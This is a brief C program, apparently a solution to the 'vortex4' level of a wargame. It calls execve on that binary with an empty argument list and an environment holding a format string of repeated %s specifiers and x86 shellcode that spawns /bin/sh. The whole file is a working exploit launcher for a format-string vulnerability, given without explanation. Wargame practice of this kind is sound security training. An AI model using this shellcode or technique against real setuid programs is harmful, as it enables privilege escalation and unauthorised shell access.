#include <unistd.h>

int main() {

  char *format = "%s%s%s%s%s%s%s%s%s%s%s";
  char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90";
  
  char *filename = "vortex4";
  char *argv[] = {NULL};
  char *arge[] = {"a", "b", format, "c", shellcode, NULL};
  
  execve(filename, argv, arge);
  
  return 0;
}
